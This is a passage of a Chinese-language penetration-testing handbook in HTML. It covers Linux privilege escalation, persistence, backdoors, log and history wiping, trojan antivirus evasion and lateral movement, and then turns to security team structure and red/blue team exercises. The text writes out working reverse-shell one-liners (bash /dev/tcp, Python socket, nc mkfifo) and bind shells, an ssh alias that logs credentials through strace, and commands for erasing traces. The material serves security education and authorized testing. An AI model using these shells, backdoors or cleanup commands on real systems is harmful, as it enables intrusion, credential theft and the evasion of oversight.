<li><code class="docutils literal notranslate"><span class="pre">mount</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">ps</span> <span class="pre">aux</span></code></li>
</ul>
</div>
</div>
<span id="document-intranet/linuxpersistence"></span><div class="section" id="linux">
<h3>持久化 - Linux<a class="headerlink" href="#linux" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>权限提升<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>内核漏洞利用</li>
<li>攻击有root权限的服务</li>
<li>利用第三方服务提权</li>
<li><dl class="first docutils">
<dt>通过有SUID属性的可执行文件</dt>
<dd><ul class="first last">
<li>查找可能提权的可执行文件</li>
<li><code class="docutils literal notranslate"><span class="pre">find</span> <span class="pre">/</span> <span class="pre">-perm</span> <span class="pre">+4000</span> <span class="pre">-ls</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">find</span> <span class="pre">/</span> <span class="pre">-perm</span> <span class="pre">-u=s</span> <span class="pre">-type</span> <span class="pre">f</span> <span class="pre">2&gt;/dev/null</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">find</span> <span class="pre">/</span> <span class="pre">-user</span> <span class="pre">root</span> <span class="pre">-perm</span> <span class="pre">-4000</span> <span class="pre">-print</span> <span class="pre">2&gt;/dev/null</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">find</span> <span class="pre">/</span> <span class="pre">-user</span> <span class="pre">root</span> <span class="pre">-perm</span> <span class="pre">-4000</span> <span class="pre">-exec</span> <span class="pre">ls</span> <span class="pre">-ldb</span> <span class="pre">{}</span> <span class="pre">\;</span> <span class="pre">2&gt;/dev/null</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>利用可用的root权限</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">-l</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>利用误配置的 crontab 任务</li>
</ul>
</div>
<div class="section" id="id2">
<h4>自启动<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>/etc/init.d</li>
<li>/etc/rc.d/rc.local</li>
<li>~/.bashrc</li>
<li>~/.zshrc</li>
</ul>
</div>
<div class="section" id="id3">
<h4>后门<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>ssh 后门</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">alias</span> <span class="pre">ssh='strace</span> <span class="pre">-o</span> <span class="pre">/tmp/.ssh.log</span> <span class="pre">-e</span> <span class="pre">read,write,connect</span> <span class="pre">-s</span> <span class="pre">2048</span> <span class="pre">ssh'</span></code></li>
<li>后门账户</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>常见应用</dt>
<dd><ul class="first last">
<li>ICMP</li>
<li>DNS</li>
</ul>
</dd>
</dl>
</li>
<li>icmp后门</li>
<li>后门端口复用</li>
<li><code class="docutils literal notranslate"><span class="pre">.</span></code> 开头隐藏文件</li>
<li>rootkit</li>
</ul>
</div>
</div>
<span id="document-intranet/linuxtrace"></span><div class="section" id="linux">
<h3>痕迹清理 - Linux<a class="headerlink" href="#linux" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>历史命令<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">unset</span> <span class="pre">HISTORY</span> <span class="pre">HISTFILE</span> <span class="pre">HISTSAVE</span> <span class="pre">HISTZONE</span> <span class="pre">HISTORY</span> <span class="pre">HISTLOG;</span> <span class="pre">export</span> <span class="pre">HISTFILE=/dev/null;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">kill</span> <span class="pre">-9</span> <span class="pre">$$</span></code> kill history</li>
<li><code class="docutils literal notranslate"><span class="pre">history</span> <span class="pre">-c</span></code></li>
<li>在 <code class="docutils literal notranslate"><span class="pre">HISTSIZE=0</span></code> 中设置 <code class="docutils literal notranslate"><span class="pre">HISTSIZE=0</span></code></li>
</ul>
</div>
<div class="section" id="id2">
<h4>清除/修改日志文件<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">/var/log/btmp</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/lastlog</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/wtmp</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/utmp</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/secure</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/message</span></code></li>
</ul>
</div>
<div class="section" id="id3">
<h4>登录痕迹<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>删除 <code class="docutils literal notranslate"><span class="pre">~/.ssh/known_hosts</span></code> 中记录</li>
<li><dl class="first docutils">
<dt>修改文件时间戳</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">touch</span> <span class="pre">–r</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>删除tmp目录临时文件</li>
</ul>
</div>
<div class="section" id="id4">
<h4>操作痕迹<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>vim 不记录历史命令 <code class="docutils literal notranslate"><span class="pre">:set</span> <span class="pre">history=0</span></code></li>
<li><dl class="first docutils">
<dt>ssh 登录痕迹</dt>
<dd><ul class="first last">
<li>无痕登录 <code class="docutils literal notranslate"><span class="pre">ssh</span> <span class="pre">-T</span> <span class="pre">user&#64;host</span> <span class="pre">/bin/bash</span> <span class="pre">-i</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id5">
<h4>覆写文件<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>shred</li>
<li>dd</li>
<li>wipe</li>
</ul>
</div>
<div class="section" id="id6">
<h4>难点<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征</li>
<li>即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录</li>
<li>留存的后门包含攻击者的信息</li>
<li>使用的代理或跳板可能会被反向入侵</li>
</ul>
</div>
<div class="section" id="id7">
<h4>注意<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>在操作前检查是否有用户在线</li>
<li>删除文件使用磁盘覆写的功能删除</li>
<li>尽量和攻击前状态保持一致</li>
</ul>
</div>
<div class="section" id="id8">
<h4>参考链接<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://mp.weixin.qq.com/s/i2WvFmF1qQjbx-BaStXb1Q">Linux 入侵痕迹清理技巧</a></li>
</ul>
</div>
</div>
<span id="document-intranet/trojan"></span><div class="section" id="id1">
<h3>后门技术<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>开发技术<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>管控功能实现技术</dt>
<dd><ul class="first last">
<li>系统管理：查看系统基本信息，进程管理，服务管理</li>
<li>文件管理：复制/粘贴文件，删除文件/目录，下载/上传文件等</li>
<li>Shell管理</li>
<li>击键记录监控</li>
<li>屏幕截取</li>
<li>音频监控</li>
<li>视频监控</li>
<li>隐秘信息查看</li>
<li>移动磁盘的动态监控</li>
<li>远程卸载</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>自启动技术</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>Windows自启动</dt>
<dd><ul class="first last">
<li>基于Windows启动目录的自启动</li>
<li>基于注册表的自启动</li>
<li>基于服务程序的自启动</li>
<li>基于ActiveX控件的自启动</li>
<li>基于计划任务（Scheduled Tasks）的自启动</li>
</ul>
</dd>
</dl>
</li>
<li>Linux自启动</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>用户态进程隐藏技术</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>基于DLL插入的进程隐藏</dt>
<dd><ul class="first last">
<li>远程线程创建技术</li>
<li>设置窗口挂钩（HOOK）技术</li>
</ul>
</dd>
</dl>
</li>
<li>基于SvcHost共享服务的进程隐藏</li>
<li>进程内存替换</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>数据穿透和躲避技术</dt>
<dd><ul class="first last">
<li>反弹端口</li>
<li><dl class="first docutils">
<dt>协议隧道</dt>
<dd><ul class="first last">
<li>HTTP</li>
<li>MSN</li>
<li>Google Talk</li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
<li>内核级隐藏技术（Rootkit）</li>
<li><dl class="first docutils">
<dt>磁盘启动级隐藏技术（Bootkit）</dt>
<dd><ul class="first last">
<li>MBR</li>
<li>BIOS</li>
<li>NTLDR</li>
<li>boot.ini</li>
</ul>
</dd>
</dl>
</li>
<li>还原软件对抗技术</li>
</ul>
</div>
<div class="section" id="id3">
<h4>后门免杀<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>传统静态代码检测</dt>
<dd><ul class="first last">
<li>加壳</li>
<li>添加花指令</li>
<li>输入表免杀</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>启发式代码检测</dt>
<dd><ul class="first last">
<li>动态函数调用</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>云查杀</dt>
<dd><ul class="first last">
<li>动态增大自身体积</li>
<li>更改云查杀服务器域名解析地址</li>
<li>断网</li>
<li>利用散列碰撞绕过云端“白名单”</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>攻击主防杀毒软件</dt>
<dd><ul class="first last">
<li>更改系统时间</li>
<li>窗口消息攻击</li>
<li>主动发送IRP操纵主防驱动</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>利用证书信任</dt>
<dd><ul class="first last">
<li>盗取利用合法证书</li>
<li>利用散列碰撞伪造证书</li>
<li>利用合法程序 DLL劫持问题的“白加黑”</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id4">
<h4>检测技术<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>基于自启动信息的检测</li>
<li>基于进程信息的检测</li>
<li>基于数据传输的检测</li>
<li>Rootkit/Bootkit的检测</li>
</ul>
</div>
<div class="section" id="id5">
<h4>后门分析<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>动态分析</li>
<li><dl class="first docutils">
<dt>静态分析</dt>
<dd><ul class="first last">
<li>反病毒引擎扫描</li>
<li>文件格式识别</li>
<li>文件加壳识别及脱壳</li>
<li>明文字符串查找</li>
<li>链接库及导入/导出函数分析</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<span id="document-intranet/misc"></span><div class="section" id="id1">
<h3>综合技巧<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>端口转发<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>windows</dt>
<dd><ul class="first last">
<li>lcx</li>
<li>netsh</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>linux</dt>
<dd><ul class="first last">
<li>portmap</li>
<li>iptables</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>socket代理</dt>
<dd><ul class="first last">
<li>Win: xsocks</li>
<li>Linux: proxychains</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>基于http的转发与socket代理(低权限下的渗透)</dt>
<dd><ul class="first last">
<li>端口转发: tunna</li>
<li>socks代理: reGeorg</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>ssh通道</dt>
<dd><ul class="first last">
<li>端口转发</li>
<li>socks</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="shell">
<h4>获取shell<a class="headerlink" href="#shell" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>常规shell反弹</li>
</ul>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">/</span><span class="mi">8080</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>

<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>

<span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="n">mkfifo</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="o">|/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="o">|</span><span class="n">nc</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">0.1</span> <span class="mi">1234</span> <span class="o">&gt;/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span>
</pre></div>
</div>
<ul class="simple">
<li>突破防火墙的imcp_shell反弹</li>
<li>正向shell</li>
</ul>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">lp</span> <span class="mi">1234</span>
<span class="n">nc</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">e</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">lp</span> <span class="mi">1234</span>
</pre></div>
</div>
</div>
<div class="section" id="id3">
<h4>内网文件传输<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>windows下文件传输</dt>
<dd><ul class="first last">
<li>powershell</li>
<li>vbs脚本文件</li>
<li>bitsadmin</li>
<li>文件共享</li>
<li>使用telnet接收数据</li>
<li>hta</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>linux下文件传输</dt>
<dd><ul class="first last">
<li>python</li>
<li>wget</li>
<li>tar + ssh</li>
<li>利用dns传输数据</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>文件编译</dt>
<dd><ul class="first last">
<li>powershell将exe转为txt，再txt转为exe</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id4">
<h4>远程连接 &amp;&amp; 执行程序<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>at&amp;schtasks</li>
<li>psexec</li>
<li>wmic</li>
<li>wmiexec.vbs</li>
<li>smbexec</li>
<li>powershell remoting</li>
<li>SC创建服务执行</li>
<li>schtasks</li>
<li>SMB+MOF || DLL Hijacks</li>
<li>PTH + compmgmt.msc</li>
</ul>
</div>
</div>
<span id="document-intranet/ref"></span><div class="section" id="id1">
<h3>参考链接<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="windows">
<h4>Windows<a class="headerlink" href="#windows" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.freebuf.com/articles/system/114731.html">Windows内网渗透提权</a></li>
<li><a class="reference external" href="https://gh0st.cn/archives/2017-03-29/1">文件寄生 NTFS文件流实际应用</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/6461">Windows中常见后门持久化方法总结</a></li>
<li><a class="reference external" href="https://lolbas-project.github.io/#">LOLBAS</a></li>
<li><a class="reference external" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4/">渗透技巧——Windows单条日志的删除</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/7155">windows取证 文件执行记录的获取和清除</a></li>
<li><a class="reference external" href="https://www.darkoperator.com/blog/2020/1/14/getting-dns-client-cached-entries-with-cimwmi">Getting DNS Client Cached Entries with CIM/WMI</a></li>
<li><a class="reference external" href="https://lengjibo.github.io/Persistence/">Windows单机Persistence</a></li>
</ul>
<div class="section" id="id6">
<h5>域渗透<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://nosec.org/home/detail/2510.html">绕过域账户登录失败次数的限制</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s?__biz=Mzg3NzE5OTA5NQ==&amp;mid=2247483807&amp;idx=1&amp;sn=59be50aa5cc735f055db596269a857ce">域渗透总结</a></li>
<li><a class="reference external" href="https://medium.com/&#64;adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa">got domain admin on internal network</a></li>
<li>Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft Techniques &lt;<a class="reference external" href="http://download.microsoft.com/download/7/7/A/77ABC5BD-8320-41AF-863C-6ECFB10CB4B9/Mitigating%20Pass-the-Hash%20(PtH)%20Attacks%20and%20Other%20Credential%20Theft%20Techniques_English.pdf">http://download.microsoft.com/download/7/7/A/77ABC5BD-8320-41AF-863C-6ECFB10CB4B9/Mitigating%20Pass-the-Hash%20(PtH)%20Attacks%20and%20Other%20Credential%20Theft%20Techniques_English.pdf</a>&gt;`_</li>
<li><a class="reference external" href="https://github.com/uknowsec/Active-Directory-Pentest-Notes">域渗透学习笔记</a></li>
<li><a class="reference external" href="https://qomplx.com/qomplx-knowledge-fundamentals-of-active-directory-trust-relationships/">QOMPLX Knowledge: Fundamentals of Active Directory Trust Relationships</a></li>
<li><a class="reference external" href="https://www.cnblogs.com/backlion/p/8127868.html">Kerberos的黄金票据详解</a></li>
<li><a class="reference external" href="https://blog.alsid.eu/dcshadow-explained-4510f52fc19d">DCShadow explained: A technical deep dive into the latest AD attack technique</a></li>
<li><a class="reference external" href="https://adsecurity.org">Active Directory Security</a></li>
<li><a class="reference external" href="https://blog.xpnsec.com/kerberos-attacks-part-1/">Kerberos AD Attacks Kerberoasting</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/7517">Kerberos之域内委派攻击</a></li>
</ul>
</div>
</div>
<div class="section" id="redteam">
<h4>RedTeam<a class="headerlink" href="#redteam" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/klionsec/RedTeamManual">RedTeamManual</a></li>
</ul>
</div>
<div class="section" id="id11">
<h4>内网<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://xz.aliyun.com/t/2354">内网安全检查</a></li>
<li><a class="reference external" href="https://www.anquanke.com/post/id/92646">我所知道的内网渗透</a></li>
<li><a class="reference external" href="https://github.com/l3m0n/pentest_study">从零开始内网渗透学习</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/1649/">渗透技巧 从Github下载安装文件</a></li>
<li><a class="reference external" href="https://offsec.provadys.com/intro-to-file-operation-abuse-on-Windows.html">An introduction to privileged file operation abuse on Windows</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/4522">脚本维权tips</a></li>
</ul>
</div>
<div class="section" id="cobalt-strike">
<h4>Cobalt Strike<a class="headerlink" href="#cobalt-strike" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://blog.leanote.com/post/snowming/Cobalt-Strike">Cobalt Strike 系列笔记</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/4191">渗透利器Cobalt Strike 第2篇 APT级的全面免杀与企业纵深防御体系的对抗</a></li>
</ul>
</div>
</div>
</div>
</div>
<span id="document-defense/index"></span><div class="section" id="id1">
<h2>防御技术<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<div class="toctree-wrapper compound">
<span id="document-defense/team"></span><div class="section" id="id1">
<h3>团队建设<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>人员分工<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>部门负责人</dt>
<dd><ul class="first last">
<li>负责组织整体的信息安全规划</li>
<li>负责向高层沟通申请资源</li>
<li>负责与组织其他部门的协调沟通</li>
<li>共同推进信息安全工作</li>
<li>负责信息安全团队建设</li>
<li>负责安全事件应急工作处置</li>
<li>负责推动组织安全规划的落实</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>合规管理员</dt>
<dd><ul class="first last">
<li>负责安全相关管理制度、管理流程的制定，监督实施情况，修改和改进相关的制度和流程</li>
<li>负责合规性迎检准备工作，包括联络、迎检工作推动，迎检结果汇报等所有相关工作</li>
<li>负责与外部安全相关单位联络</li>
<li>负责安全意识培训、宣传和推广</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>安全技术负责人</dt>
<dd><ul class="first last">
<li>业务安全防护整体技术规划和计划</li>
<li>了解组织安全技术缺陷，并能找到方法进行防御</li>
<li>安全设备运维</li>
<li>服务器与网络基础设备的安全加固推进工作</li>
<li>安全事件排查与分析，配合定期编写安全分析报告</li>
<li>关注注业内安全事件， 跟踪最新漏洞信息，进行业务产品的安全检查</li>
<li>负责漏洞修复工作推进，跟踪解决情况，问题收集</li>
<li>了解最新安全技术趋势</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>渗透/代码审计人员</dt>
<dd><ul class="first last">
<li>对组织业务网站、业务系统进行安全评估测试</li>
<li>对漏洞结果提供解决方案和修复建议</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>安全设备运维人员</dt>
<dd><ul class="first last">
<li>负责设备配置和策略的修改</li>
<li>负责协助其他部门的变更导致的安全策略修改的实现</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>安全开发</dt>
<dd><ul class="first last">
<li>根据组织安全的需要开发安全辅助工具或平台</li>
<li>参与安全系统的需求分析、设计、编码等开发工作</li>
<li>维护公司现有的安全程序与系统</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id3">
<h4>参考链接<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://mp.weixin.qq.com/s/BqOFP217kiN55IWb_oQP-w">初入甲方的企业安全建设规划</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/RlBTH9-xrY7Nd1ZJK3KjDQ">企业安全项目架构实践分享</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/1965">企业信息安全团队建设</a></li>
</ul>
</div>
</div>
<span id="document-defense/redteam"></span><div class="section" id="id1">
<h3>红蓝对抗<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>概念<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>红蓝对抗的概念最早来源于20世纪60年代的美国演习，演习是专指军队进行大规模的实兵演习，演习中通常分为红军、蓝军，其中蓝军通常是指在部队模拟对抗演习专门扮演假想敌的部队，与红军(代表我方正面部队)进行针对性的训练，这种方式也被称作Red Teaming。</p>
<p>网络安全红蓝对抗的概念就源自于此。红军作为企业防守方，通过安全加固、攻击监测、应急处置等手段来保障企业安全。而蓝军作为攻击方，以发现安全漏洞，获取业务权限或数据为目标，利用各种攻击手段，试图绕过红军层层防护，达成既定目标。可能会造成混淆的是，在欧美一般采用红队代表攻击方，蓝队代表防守方，颜色代表正好相反。</p>
</div>
<div class="section" id="id3">
<h4>网络攻防演习<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>比较有影响力的演习有“锁盾”(Locked Shields)、“网络风暴”等。其中“锁盾”由北约卓越网络防御合作中心(CCDCOE，Cooperative Cyber Defence Centre of Excellence)每年举办一次。“网络风暴”由美国国土安全部(DHS)主导，2006年开始，每两年举行一次。</p>
<p>和APT攻击相比，攻防演习相对时长较短，只有1~4周，有个防守目标。而APT攻击目标唯一，时长可达数月至数年，更有隐蔽性。</p>
</div>
<div class="section" id="id4">
<h4>侧重<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<p>企业网络蓝军工作内容主要包括渗透测试和红蓝对抗，这两种方式所使用的技术基本相同，但是侧重点不同。</p>
<p>渗透测试侧重用较短的时间去挖掘更多的安全漏洞，一般不太关注攻击行为是否被监测发现，目的是帮助业务系统暴露和收敛更多风险。</p>
<p>红蓝对抗更接近真实场景，偏向于实战，面对的场景复杂、技术繁多。侧重绕过防御体系，毫无声息达成获取业务权限或数据的目标。不求发现全部风险点，因为攻击动作越多被发现的概率越大，一旦被发现，红军就会把蓝军踢出战场。红蓝对抗的目的是检验在真实攻击中纵深防御能力、告警运营质量、应急处置能力。</p>
</div>
<div class="section" id="id5">
<h4>目标<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>评估现有防御能力的有效性、识别防御体系的弱点并提出具体的应对方案</li>
<li>利用真实有效的模拟攻击来评估因为安全问题所造成的潜在的业务影响，为安全管理提供有效的数据来量化安全投入的ROI</li>
<li>提高公司安全成熟度及其检测和响应攻击的能力</li>
</ul>
</div>
<div class="section" id="id6">
<h4>前期准备<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>组织结构图</li>
<li>全网拓扑图</li>
<li>各系统逻辑结构图</li>
<li>各系统之间的调用关系</li>
<li>数据流关系</li>
<li><dl class="first docutils">
<dt>资产梳理</dt>
<dd><ul class="first last">
<li>核心资产清单</li>
<li>业务系统资产</li>
<li>设备资产</li>
<li>外包/第三方服务资产</li>
<li>历史遗留资产</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>业务资产信息</dt>
<dd><ul class="first last">
<li>业务系统名称</li>
<li>业务系统类型</li>
<li>服务器类型</li>
<li>域名/IP地址</li>
<li>服务端口</li>
<li>版本</li>
<li>系统部署位置</li>
<li>开发框架</li>
<li>中间件</li>
<li>数据库</li>
<li>责任人</li>
<li>维护人员</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>设备资产信息</dt>
<dd><ul class="first last">
<li>设备名称</li>
<li>设备版本号</li>
<li>固件版本号</li>
<li>IP地址</li>
<li>部署位置</li>
<li>责任人</li>
<li>维护人员</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>外包/第三方服务资产信息</dt>
<dd><ul class="first last">
<li>厂商联系方式</li>
<li>系统名称</li>
<li>系统类型</li>
<li>IP/URL地址</li>
<li>部署位置</li>
<li>责任人</li>
<li>维护人员</li>
<li>厂商联系方式</li>
<li>第三方值班人员</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>风险梳理</dt>
<dd><ul class="first last">
<li>基础设施风险</li>
<li>帐号权限梳理</li>
<li>互联网风险排查</li>
<li>收敛攻击面</li>
</ul>
</dd>
</dl>
</li>
<li>应急响应计划</li>
<li>业务连续性计划</li>
<li>灾难恢复计划</li>
</ul>
</div>
<div class="section" id="id7">
<h4>行动流程<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>攻击准备</dt>
<dd><ul class="first last">
<li>明确授权范围、测试目标、限制条件等</li>
<li>报备与授权流程</li>
<li>行动成本与预算</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>攻击执行</dt>
<dd><ul class="first last">
<li>备案的时间区间内</li>
<li>备案的目标范围内</li>
<li>备案的攻击IP与网络环境</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>攻击完成</dt>
<dd><ul class="first last">
<li>恢复所有修改</li>
<li>移除所有持久化控制</li>
<li>提交攻击报告与改进建议</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id8">
<h4>注意事项<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>测试前进行报备</li>
<li>有可能会影响到业务的操作时候提前沟通</li>
<li>漏洞和业务沟通确认后再发工单修复</li>
<li>漏洞闭环</li>
</ul>
</div>
<div class="section" id="id9">
<h4>参考链接<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://mp.weixin.qq.com/s/8iJs2ON66NY1Jdbt7c-BTA">以攻促防 企业蓝军建设思考</a></li>
<li><a class="reference external" href="http://avfisher.win/archives/1175">云上攻防：Red Teaming for Cloud</a></li>
<li><a class="reference external" href="https://www.freebuf.com/articles/neopoints/252229.html">网络攻防演练之企业蓝队建设指南</a></li>
</ul>
</div>
</div>
<span id="document-defense/sdl"></span><div class="section" id="id1">
